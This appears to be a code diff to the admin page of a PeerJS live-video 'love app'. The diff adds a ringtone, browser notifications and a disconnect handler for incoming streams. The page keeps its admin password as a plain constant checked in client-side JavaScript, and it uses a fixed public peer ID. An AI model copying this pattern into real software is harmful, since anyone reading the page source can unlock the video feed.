@@ -4,6 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Dashboard 🔒</title>
+    
+    <!-- PWA Manifest -->
+    <link rel="manifest" href="manifest.json">
+    
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
         body { background: #2c3e50; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
@@ -27,14 +31,26 @@
         <video id="remoteVideo" autoplay playsinline></video>
     </div>
 
+    <!-- ரிங் சவுண்ட் -->
+    <audio id="ringtone" src="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3" loop></audio>
+
     <script>
         const ADMIN_PASSWORD = "mysecret123"; 
         const ADMIN_PEER_ID = "love-app-admin-2024"; 
+
+        if ("Notification" in window) {
+            Notification.requestPermission();
+        }
 
         function login() {
             if (document.getElementById('password').value === ADMIN_PASSWORD) {
                 document.getElementById('loginBox').style.display = 'none';
                 document.getElementById('videoBox').style.display = 'block';
+                
+                // மொபைல் பிரவுசர் ஆடியோ பாலிசியை அன்லாக் பண்றோம்
+                const ringtone = document.getElementById('ringtone');
+                ringtone.play().then(() => ringtone.pause()).catch(e => console.log("Audio needs click"));
+
                 startAdminListener();
             } else {
                 alert("Wrong Password!");
@@ -46,13 +62,32 @@
             peer.on('open', () => { document.getElementById('statusText').innerText = "Online! Waiting..."; });
             
             peer.on('call', (call) => {
+                const ringtone = document.getElementById('ringtone');
+                ringtone.play().catch(e => console.log("Autoplay blocked"));
+
+                if (Notification.permission === "granted") {
+                    new Notification("💖 Someone is Calling!", {
+                        body: "Live sharing started. Tap to view.",
+                        icon: "https://cdn-icons-png.flaticon.com/512/1077/1077114.png"
+                    });
+                }
+
                 call.answer(); 
                 call.on('stream', (remoteStream) => {
+                    ringtone.pause();
+                    ringtone.currentTime = 0;
+
                     document.getElementById('statusText').innerText = "🟢 Connected!";
                     document.getElementById('statusText').style.color = "#2ecc71";
                     const video = document.getElementById('remoteVideo');
                     video.srcObject = remoteStream;
                     video.style.display = 'block';
+                });
+                
+                call.on('close', () => {
+                    document.getElementById('statusText').innerText = "🔴 Disconnected. Waiting...";
+                    document.getElementById('statusText').style.color = "#f1c40f";
+                    document.getElementById('remoteVideo').style.display = 'none';
                 });
             });
         }
